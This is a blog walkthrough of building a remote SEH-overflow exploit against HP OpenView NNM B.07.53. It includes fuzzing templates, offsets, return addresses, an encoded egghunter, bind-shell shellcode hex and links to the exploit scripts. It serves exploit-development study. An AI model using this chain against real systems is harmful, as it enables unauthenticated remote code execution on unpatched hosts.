In [DEFCON #16](https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Aharoni), there was an interesting session on `HP OpenView NNM` exploitation ***"from bug to 0 day"*** presented by *muts*. While watching his walk-through, I found that this particular exploit development process was extremely intense and challenging. To better understand the concepts, I decided to take that as an **exercise** and try to reproduce the same in my local environment.

Surprisingly, the final part of the journey turned out to be a `zero-day` for me as well in the specific `B.07.53` version.


## Environment & Tools

```bash
- 32-bit windows server 2003-R2-SP2 (disabled DEP, enabled ASLR)
- python 2.7 x86, pydbg 32-bit binary, python wmi, pywin32
- HP OpenView NNM release - B.07.53
- Immunity Debugger v1.85, mona.py v2.0
- Kali 2.0, Spike fuzzer, python 3.7.x (exploit scripts)
```

## Web Interface

Install HP `OpenView NNM` (release - `B.07.53`) on `Windows 2003-R2-SP2`.

Browse itâ€™s web interface - `http://172.16.232.198:7510/topology/home` to verify everything is up and running.

![hpnnm_version](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/hpnnm_version.png)

## Fuzz Variables

Sniff the `HTTP` traffic through `Burp` proxy and identify `5` potential fuzz points (HTTP method, url_path, ip_address, port, user_agent header) on that `GET` request.

![http-sniff](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/http_sniff.png)

To crash the application, create a `Spike` template - `http.spk`.

```
s_string_variable("GET");
s_string(" ");
s_string_variable("/topology/home")
s_string(" ");
s_string("HTTP/1.1");
s_string("\r\n");

s_string("Host: ");
s_string_variable("172.16.116.198");
s_string(":");
s_string_variable("7510");
s_string("\r\n");

s_string("User-Agent: ");
s_string_variable("Mozilla/5.0 (X11; U; Linux i686;en-US; rv:1.8.1.14)");
s_string("\r\n");

s_string("\r\n");
```

## Process - `ova.exe`

It is observed that `ova.exe` process is responsible for listening to the network connection on `TCP` port `7150`.

![ovas-process](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/ovas_process.png)

## Crash

Attach and run the `ovas.exe` process through `Immunity`.

Start fuzzing  the `http.spk` template through `Spike` fuzzer.

```
generic_send_tcp 172.16.116.198 7510 http.spk 0 0
```

It is observed that while fuzzing the `host` header, application crashes.

Verify and confirm the same by inspecting the `host header` in the memory dump.

![crash](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/crash.png)

#### Analyzing the crash scenario

* `SEH` and `nSEH` both are overwritten by fuzz buffer `A`.
* It is possible to control/overwrite the `EIP` after passing the exception to the program.
* `ESP + 0x4C` points at the 1025^th byte of our fuzz buffer.
* Approximate `2048 bytes` buffer causes this crash.

## The Bug

HP OpenView NNM - `B.07.53` does not validate the `host` header while processing any `un-authenticated` HTTP request. As a result, an attacker can overwrite the `SEH chain` by sending a sizeable crafted buffer and hijack the execution flow.

## Proof Of Concept

Restart `ovas.exe` and attach it within `Immunity`.

Set up the working directory for  `mona.py`.

```
!mona config -set workingfolder c:\mona-logs\%p
```

Send the `2048 bytes` buffer to verify and reproduce the same crash with a stand-alone python script.

Exploit code: [hpnnm_B.07.53_exploit_v0.1.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.1.py)

## Best Buffer Length

Try to play with different buffer lengths to figure out the `maximum length `of the fuzz buffer, which produces the `same` crash.

After analyzing different crashes, it is observed that `3780 bytes` buffer can be the right choice.

Exploit code: [hpnnm_B.07.53_exploit_v0.2.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.2.py)



## `nSEH` & `SEH` Offsets

Create `3780 bytes` unique pattern through `mona.py`.

```
!mona pattern_create 3780
```

Then copy those bytes from `C:\mona-logs\ovas\pattern.txt` and update the skeleton code.

Exploit code: [hpnnm_B.07.53_exploit_v0.3.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.3.py)


During the crash, inspect the `SEH chain`  and select the `first corrupted-entry` and then follow the address in the stack.

![overflow_seh_chain](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/overflow_seh_chain.png)

It is observed that

- `nSEH` is overwritten with pattern => `32674531`
- `SEH` is overwritten with pattern => `45336745`

Leverage `mona.py` to find the correct offsets:

- `nSEH` offset: `!mona pattern_offset  32674531` => `3305`
- `SEH` offset: `!mona pattern_offset  45336745` =>   `3309`

![seh_offset_found](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/seh_offset_found.png)

To verify those offsets, divide the original buffer into four different blocks - `A`, `B`, `C`, `D`, and update the skeleton code with those identified offset values.

Exploit code: [hpnnm_B.07.53_exploit_v0.4.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.4.py)


During the crash, the entire buffer is laid in memory in our expected way.

![verify_seh_offset](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/verify_seh_offset.png)

Calculate the length of `D` buffer = `464 bytes`.

![d_block_length](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/d_block_length.png)

> Even if we have identified the maximum buffer length, this length is too small to accommodate an encoded version of the final payload.

## `POP` `POP` `RET`

Try to identify which modules are not compiled with `SafeSEH` and `ASLR`.

```
!mona nosafesehaslr
```

There are plenty of options.

![mona output - nosafesehaslr](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/nosafesehaslr.png)

Select `jvm.dll` module and pick up a `PPR` address => `0x6D6FA245`

- `!mona seh -m jvm.dll`
- This command generates the `seh.txt`.

![ppr address from jvm.dll](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/jvm.dll_ppr_address.png)

Update the skeleton code in little endian order = `\x45\xa2\x6f\x6d`.

Exploit code: [hpnnm_B.07.53_exploit_v0.5.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.5.py)


After that, set up a breakpoint at `0x6D6FA245` to verify if it is possible to land on that address during the crash.

![breakpoint_0x6d6e394a.png](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/breakpoint_0x6d6e394a.png)

However during the crash, when we pass the exception to the program, the `SEH` address is mangled into `0xA2BEEF45`

little endian order: `\x45\xef\xbe\xa2`

![mangled ppr address](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/ppr_addr_6d6fa245_mangled.png)

It looks like some character translation/filtering is applied to the buffer. Due to this, we now need to find a **bad char friendly** `PPR` address.

## Bad & Good Characters

Use [badchar_detection_HPNNM_B.07.53.py](https://github.com/greyshell/windows_exploit_dev/blob/master/exploit_utils/badchar_detection_automated/badchar_detection_HPNNM_B.07.53.py) to identify all `good` and `bad` characters in an automated fashion.

##### Script result

> During the crash, `ESP + 0x4c` pointed at the `1025`-the bytes of the fuzz buffer.

##### Algorithm

- Start the `ovas.exe` process:
  - `ovstop -c ovas && ovstart -c ovas`
- While sending the buffer, place a `test-char` at the `1025`-th position.
- if (application does not crash) OR (`ESP + 0x4c` does not have the value during crash time) then
  - consider that `test-char` as `bad`
  - write it down in `badchars.txt`
- else
  - consider that `test-char` as `good`
  - write it down in `goodchars.txt`
- Kill the `ovas.exe` process:
  - `taskkill /f /im ovas.exe`
- Verify another `test-char` from all character set and repeat the same process and iterate all characters from `\x00` to `\xff`.

## Safe `POP` `POP` `RET`

Run [find_safe_address.py](https://github.com/greyshell/windows_exploit_dev/tree/master/exploit_utils/find_safe_address) to identify all safe `PPR` address from `seh.txt`.

![finding-safe-ppr.py output](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/output_finding_safe_ppr.png)

Pick up the first address - `0x6d6e394a` and set up a breakpoint to verify that.

![breakpoint at 0x6d6e394a](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/breakpoint_0x6d6e394a.png)

Run the following exploit code updated with a `safe PPR` address.

Exploit code: [hpnnm_B.07.53_exploit_v0.6.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.6.py)


As expected, this time, that address does not mangle during the crash.

![0x6d6e394a did not mangled during crash](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/0x6d6e394a_not_mangled.png)

Pass the exception and land on the breakpoint.

![land into 0x6d6e394a](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/land_to_ppr_0x6d6e394a.png)

Step through `POP POP RET` and finally jump into `nSEH`.

![reach to nseh](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/jump_nseh.png)

## Jump Over `SEH`

In `nSEH`, we can't directly write a `4` byte `jump code` to meet `D` buffer because the `short jump` opcode (`\xeb`) is a bad char.

Now we need to identify all `safe` instructions from our `good_char.txt`.

Run [find_safe_opcode.py](https://github.com/greyshell/windows_exploit_dev/tree/master/exploit_utils/find_safe_opcode) and identify all `safe` instructions. From there, find that `conditional jump` instructions are safe to execute.

![finding safe opcode JA](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/safe_opcode_JA.png)

Conditional jump `JA` (`\x77`) occurs when

- `CF = 0` and `ZF = 0`
- Jump must be within `-128 to +127` bytes of the next instruction.

So if we want to jump `4 bytes` (i.e. `\x04` is a safe character), then the opcode `is \x77\x04`

Now at crash point, it is noticed that `ZF = 1` and `CF = 0`.

To make `ZF = 0` and to satisfy the jump condition, we can perform an operation that produces a non zero result (i.e., decrease the  `EAX` register)

- `DEC EAX` => opcode  `\x48` is a safe char

>To satisfy the flag condition (`ZF = 0`), decreasing the `EAX` register `1` time is sufficient.
>However, `opcode` for this instruction is `one byte`, so we need to fill another byte with a value (in the stack it gets interpreted as an instruction) that does not impact the `ZF` flag.
> Due to this, we can use `DEC EAX` => `\x48` another time as it does not change the `ZF` flag.

Select the jump offset = `\x04` to jump over `SEH` and meet the `D` buffer.

```
# 1035FE34   48               DEC EAX
# 1035FE35   48               DEC EAX
# 1035FE36   77 04            JA SHORT 1035FE59
```

Update the skeleton code to overwrite `nSEH` with `\x48\x48\x77\x04` and set a break point at `0x6d6e394a`.

Exploit code: [hpnnm_B.07.53_exploit_v0.7.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.7.py)


You can see, during the crash, the breakpoint is hit, and after stepping through `POP POP RET`, control goes to the `nSEH`. After that, it executes all instructions stored on `nSEH` and finally jumps forward `4 bytes` and meet `D` buffer block.

![jump over seh](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/jump_over_seh.png)


## Egghunter

At this point, roughly `464 bytes` are left in `D` buffer.

##### Problem

- This `D` buffer suffers from character translation. Due to this, we can't directly write any shellcode/payload here.
- Again if we use any existing encoder from `msfvenom`  after eliminating all those bad characters, then the final payload size will be huge.

##### Solution

- We can choose a smaller stage 1 payload, such as `32` bytes egghunter.
- We can use a `custom encoder` that generates less than `464` bytes output for the `32` byte egghunter code.
- We can write the original shellcode somewhere in the memory that has more space.

## `Alphanum` Encoder

Use `mona.py` `alphanum` encoder to encode `32 bytes` `egghunter` payload. This encoder uses only  `AND`, `SUB`, `PUSH` operations during the encoding process, and those instructions are bad characters friendly.

We need to choose an egg marker, and that needs to be bad character friendly as well.

lets choose egg_marker =  `T00wT00W`

```
!mona encode ascii -t alphanum -b '\x00\x0a\x0d\x2f\x3a\x3f\x40\x80..\xff' -s 6681CAFF0F42526A0258CD2E3C055A74EFB8543030578BFAAF75EAAF75E7FFE7
```

It generates the `encoded_alphanum.txt` inside `mona-logs\ovas` directory.

```
encoded egghunter in hex format, egg_marker = T00wT00W

```

![encoder output](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/mona_alphanum_encoder_output.png)

## Adjust ESP

When we jump over `SEH` and land into `D` buffer, at this point, let's check our `PC`(i.e. `EIP`) and `ESP` address.

```
ESP => 2216E6D8
EIP => 2216FBF0
```

Usually when `ESP` > `EIP`, we need to perform **stack pointer adjustment** and make `ESP` <= `EIP`.

Because during this condition,  `PC` and `ESP` both will `move towards` each other, and any `PUSH` instruction stored in the path of `PC`, overwrite an existing instruction in the stack. Thus it modifies the original shellcode/payload.

In our present scenario, `ESP` < `EIP`. During execution, `PC` and `ESP` both move away from each other. Due to this, there is no risk of instruction overwrite.

**However**, if we inspect our encoded version of egghunter code, then we can observe the followings

- for the **first** `PUSH` operation, it inserts the` last 4 bytes` of the original egghunter code into the stack.
- for the **second** `PUSH` operation, it inserts the `second last 4 bytes` of the original egghunter code into the stack.
- It means, for every `PUSH`,  `ESP` moves towards low memory by `4 bytes`.
- After 8^th `PUSH` operation, `ESP` points to the `first 4 bytes `of the original egghunter code.

We have to point/set the `ESP` far down to the high memory if we want to generate the original egghunter after the encoded egghunter payload.

Due to this reason, we need to adjust the `ESP`. But how far we need to go that depends on the length of ( esp_set_up_logic + encoded_payload + original_payload).

```
# for example
esp_setup_logic = 7 bytes (assuming)
encoded_egghunter = 208 bytes
original_egghunter = 32 bytes

# we need to set the ESP to some value > 247 (7 + 208 + 32)
```

##### Problem

- We can't use `ADD ESP` directly because  `\xEC` is a bad character.
- `ASLR` protection is `enabled` so we can't `hardcode` any address.
- Further, based on the value of the `EIP`, we need to adjust the `ESP` dynamically.

##### Solution

- First, we need to get hold of the `program counter` value into some register (i.e. `EAX`)
- Then we need to perform `ADD` operation on that register with some `safe` character/value.
- Then `PUSH` the register on the stack then `POP` that out into `ESP`. So that `ESP` contains the same value as `EAX`.

##### Thought Process

1. If we observe, when we jump over `nSEH` and meet our `D` buffer, at that point =>  `ESP` points to `nSEH`.
2. However the interestingly,  it is just `8 bytes` away from  `program counter` / `EIP`.
3. So if we move this `ESP` value to `EAX` then we can get hold of the `program counter` approximately.
4. If the length of the encoded_egghunter = `208`, original_egghunter = `32` then minimum we need to add `240` ~ `250` to `EAX` .
5. Here I am assuming `esp_setup_logic` takes maximum `10` bytes.
6. We can add any more than `250` but less than `464`. We are very much flexible in this.

If we try to add `250` to `EAX` then the final opcode would be like below

```
ADD EAX, 0xfa # 0xfa => 250
String Literal: "\x05\xFA\x00\x00\x00"
```

The tool used: https://defuse.ca/online-x86-assembler.htm

But `\xfa` is a bad char, and we can't use that. Moreover, the final opcode contains other bad chars such as  `ADD EAX`  => `\x05`and three `null` bytes.

To resolve this, we have to avoid `ADD EAX` instruction.

##### Solution

Instead of using the entire `32` bytes register, we can use lower `16` bytes to perform the `addition` operation.  This technique provides the same result.

`ADD AX` => `\x66` (safe char)

```
ADD AX, 0xfa
String Literal: 0x66, 0x05, 0xFA, 0x00
```

But still, the final opcode has another `null` byte.

We can't choose `251` to `255` as `\xfa` to `\xff`. All are bad chars.

- `256` => 0x100 => also contains null byte
- `257` => 0x101 => but here  `\x01` `\x01 ` both chars are safe. We can use this.

Thus, using this `backtrack trial` method, we can `finalize` the `value` to be added.

> We are quite flexible in choosing the `value` to be added to adjust the `ESP`.
> Remember that the `value` should not be larger than  `464`.

Lets choose the value = `300` => `12C` (`01`, `2c`  both are safe chars).

```
ADD AX, 0x12c
String Literal: "\x66\x05\x2C\x01"
```

So our final `esp_setup_logic` will be

```
# 2216FDF0   58               POP EAX  => ESP holds the EIP (approx.)
# 2216FDF8   66:05 2C01       ADD AX,12C => add 300 with present value, 0x01 and 0x2c => both are safe character

# 2216FDF6   50               PUSH EAX
# 2216FDF7   5C               POP ESP  => moving the EAX value to ESP
```

Total length = `7` bytes.

## Program Flow

- During program run, when all instructions of the `esp_setup_logic` are executed, at that point `ESP` > `EIP`.

- After that, we want the program should execute all encoded egghunter's instructions.

- During this process, `PC` moves toward `high memory` and in the path, while executing every `PUSH` instruction by `PC`, `ESP ` moves towards `low memory`.

- When all instructions of the `encoded egghunter` are finished, during that point, the `ESP` points at the very 1^st block of the actual egghunter code.

![begining_of_egghunter](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/begining_of_egghunter.png)

- After executing the `encoded egghunter `code, the `PC ` or `EIP` rolls down and executes all `INC ECX` and eventually reaches the beginning of the normal egghunter code. At that point `ESP` = `EIP`.
- After that, the `EIP` starts executing the egghunter code. At that point `ESP` < `EIP`.

- Finally, when the egghunter code execution is completed, it finds the address of the egg signature  - `T00WT00W` and passes the execution control by jumping to the address where `EDI` points.

##### Key Points

- When the program execution happens from the stack, then the `opcode` placed on the buffer gets interpreted as `instruction`.  That means `A` is interpreted as `INC ECX`.
- Every `PUSH` instruction in the` encoded_egghunter_logic `, overwrites the `INC ECX` instruction on the stack and, finally, approximate `41 bytes` of  `A` buffer gets stored between the `encoded_egghunter_logic` and expanded `actual egghunter`.
- The increment of the `ECX` register does not have any impact on `ESP`.

## Code Cave

> If we place another large buffer at the end of the `HTTP` request as `POST` data, then would it affect the entire crash?

To examine that scenario, create a pattern of `1500` bytes and send this new buffer as `POST` data.

`!mona pattern_create 1500`

Exploit code: [hpnnm_B.07.53_exploit_v0.9.py](
https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/hpnnm_B.07.53_exploit_v0.9.py)


During the crash, `!mona suggest` finds the cyclic pattern at `0x04df6fd1`.

But the original buffer is reduced into `139 bytes`.

That length is too little to accommodate a reverse/bind shell payload. It seems application puts a limit on the length of `HTTP POST` data.

![post data pattern found](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/postdata_pattern.png)

Due to this, we need to put the final shellcode/payload **at the beginning of the input buffer** in an `encoded form`  and the same way we need to adjust  `ESP` to generate the actual shellcode dynamically in stack memory.

## Final Payload
Generate `328 bytes` `shell_bind_tcp` payload using `msfvenom`.

```bash
(venv) â•­â”€root@kali ~
â•°â”€# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -f hex
No encoder or badchars specified, outputting raw payload
Payload size: 328 bytes
Final size of hex file: 656 bytes

```

While trying to encode that payload using `mona.py` `alphanum` encoder, **I encountered another challenge**.

The `Immunity`  `textbox` has some length limitations. Due to this reason, we can't put the entire command and execute it even if we can't run `mona.py` outside the debugger context.

```
!mona encode ascii -t alphanum -b '\x00\x0a\x0d\x2f\x3a\x3f\x40\x80..\xff' -s fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200115c89e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
```

## `alpha_num_encoder.py`

Use [alpha_num_encoder.py](https://github.com/greyshell/windows_exploit_dev/tree/master/exploit_utils/alpha_num_encoder) to encode the `hex` formatted payload generated from `msfvenom`.

```bash
 alpha_num_encoder.py [-h] -p  -b

encode a payload using alpha_num_encoder

optional arguments:
  -h, --help            show this help message and exit
  -p , --payload        provide a text file containing payload in hex format
  -b , --bad_characters
                        provide a text file containing all bad characters in
                        hex format
```

## `ESP` Align By `4`

As we know that `ASLR` is turned on, so we need to make sure and align the stack pointer / `ESP` always by 4 to run the shellcode `reliably`.

It means, for a `32` bit system, the address stored in the `ESP` should always be divisible by `4`.

We can use the following logic to achieve this.

```
# ESP alighment by 4
0:  83 ec 10                sub    esp,0x10
3:  54                      push   esp
4:  58                      pop    eax
5:  31 d2                   xor    edx,edx
7:  bb 04 00 00 00          mov    ebx,0x4
c:  f7 f3                   div    ebx
e:  29 d4                   sub    esp,edx

# hex bytes = 83EC10545831D2BB04000000F7F329D4
```

However, the hex bytes contain some bad characters.

To overcome this, `prepend` this logic/hex bytes just before the actual shellcode and use `alpha_num_encoder.py` to encode the entire string.

```
# payload.txt (esp_align_by_4 logic + shellcode)
83EC10545831D2BB04000000F7F329D4fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200115c89e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
```

In this way, we can make sure that the code can be placed/run before the actual shellcode.

```
(playbook) â•­â”€root@kali ~/code-dev/python/hands-on_python3/hpnnm-B.07.53
â•°â”€# python alpha_num_encoder.py -p payload.txt -b bad_chars.txt > result.txt
```

Detailed output of the script =>  [result.txt](https://github.com/greyshell/windows_exploit_dev/blob/master/exploits/hpnnm-B.07.53/result.txt)

## Buffer Layout

From the egghunter code, we can figure out that when the egghunter finds the egg marker, it loads up `JUMP` address into the `EDI` register.

So we can quickly get hold of the `EIP` by directly moving that `EDI` value to `EAX`.

```
  # 04DD74D6   57               PUSH EDI => \x57 is good char
  # 04DD74D7   58               POP EAX => \x58 is good char
```

Now let's find what `value` we can add with `AX` register.

```
# for example
esp_setup_logic = 7 ~ 10 bytes
encoded_logic(esp_adjust_by_4_logic + shell_bind_tcp payload) = 2236 bytes
actual_esp_adjust_by_4_logic = 16 bytes
actual_shell_reverse_tcp_payload = 328 bytes
============================================
total = 2580 bytes

# we need to set the ESP to some value > 2580 but less than 3305
# 2580 => in hex format 0xa14
# \x0a is bad char so we need to find the next good char.
# after \x09, \x0b is good char => so we can use the value 0x0b as the stating char.
# for the last char, we can choose any value from the good char set. lets choose => 0x01

# final logic
PUSH EDI
POP EAX
ADD AX, 0xb01 # adding 2817
PUSH EAX
POP ESP
```

Use `mona.py` to generate the opcode.

```
!mona assemble -s "push edi#pop eax#add ax,0xb01#push eax#pop esp"
"\x57\x58\x66\x05\x01\x0B\x50\x5C"
```

Prepare the final buffer that will layout in the `memory` like below.

![stack_layout.png](assets/2016-11-07-exploit_dev_hp_openview_nnm.assets/stack_layout.png)

We have to use the initial `3305` bytes buffer to fit the following.

- egg marker - `T00WT00W`
- `ESP` setup_logic.
- `Encoded` version of `align_stack_pointer_logic` and  `shell_bind_tcp` shellcode.
- Remaining buffer where `align_stack_pointer_logic` and `actual shellcode` will expand during runtime.

## The Shell

Fired up the final exploit code, and it opens a TCP port `4444`.

## Conclusion

At the end of my journey, I found my final exploit code was turned out entirely different from ***muts*** [EDB-ID #5342](https://www.exploit-db.com/exploits/5342/).
The reason was, `B.07.53` release validates the length of `GET` request, which restricted me from delivering the payload the way **muts** did.
